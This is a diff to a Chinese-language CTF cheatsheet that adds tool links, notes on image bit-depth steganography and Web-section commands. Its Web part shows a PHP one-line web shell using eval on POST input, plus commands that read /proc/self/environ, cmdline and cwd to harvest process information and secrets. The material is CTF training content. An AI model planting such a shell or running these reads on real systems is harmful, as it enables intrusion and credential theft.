@@ -38,6 +38,7 @@
 - 零宽字符：http://330k.github.io/misc_tools/unicode_steganography.html
 - Base64填充位隐写读取：https://github.com/cjcslhp/wheels/tree/master/b64stego
 - yafu：RSA解题中的因式分解 https://github.com/bbuhrow/yafu
+- factordb：在线大数分解数据库 http://factordb.com/
 
 ### Misc
 
@@ -89,6 +90,10 @@
 - IDA：https://hex-rays.com/ida-pro/
 - Ollydbg：https://www.ollydbg.de/
 - angr：二进制分析 https://github.com/angr/angr
+
+### 其他
+
+- 挖矿收益计算器：https://minersns.com/tools/jsqlist
 
 ## Cheatsheet
 
@@ -398,6 +403,22 @@ Usage:
 
 ![image-20221115160008245](images/202211151600283.png)
 
+##### 位深隐写
+
+图片常见深度有：
+
+- 8Bit（包含四个通道：RGBA，每个通道分别占有2bit）
+- 12Bit（包含三个通道：RGB，每个通道分别占有4bit）
+- 24Bit（包含三个通道：RGB，每个通道分别占有8bit）
+- 32Bit（包含四个通道：RGB，每个通道分别占有8bit）
+
+图片位深隐写特征：
+
+- 图片→属性→详细信息，位深度可能为48bit
+- 使用stegsolve时发现A通道空白（说明该图片只有三个通道RGB，每个通道深度是48/3=16bit。图片显示最高通道就只有8bit，得出该图片隐藏了另外8bit的信息）
+
+图片位深隐写脚本：[stega_8bit.py](https://github.com/Threekiii/Awesome-CTF/blob/master/scripts/misc/stega_8bit.py)
+
 #### 压缩包分析
 
 不同压缩包分析方法分别用于：
@@ -512,10 +533,30 @@ java -jar ZipCenOp.jar xxx.zip
 
 ### Web
 
-#### 一句话木马
+#### 常用命令
+
+##### 一句话木马
 
 ```
 <?php @eval($_POST['shell']);?>
+```
+
+##### 利用/proc目录获取信息
+
+```
+# 获取目标当前进程的运行目录与目录里的文件
+ls -al /proc/self/cwd
+ls /proc/self/cwd
+```
+
+```
+# 获取当前环境变量
+cat /proc/self/environ
+```
+
+```
+# 获取当前启动进程的完整命令
+cat /proc/self/cmdline
 ```
 
 #### localhost绕过
@@ -725,4 +766,5 @@ sh.interactive()
 - 二维码010101绘制：
   - [qrcode_painter_1.py](https://github.com/Threekiii/Awesome-CTF/blob/master/scripts/misc/qrcode_painter_1.py)
   - [qrcode_painter_2.py](https://github.com/Threekiii/Awesome-CTF/blob/master/scripts/misc/qrcode_painter_2.py)
+- 图片位深隐写：[stega_8bit.py](https://github.com/Threekiii/Awesome-CTF/blob/master/scripts/misc/stega_8bit.py)
 
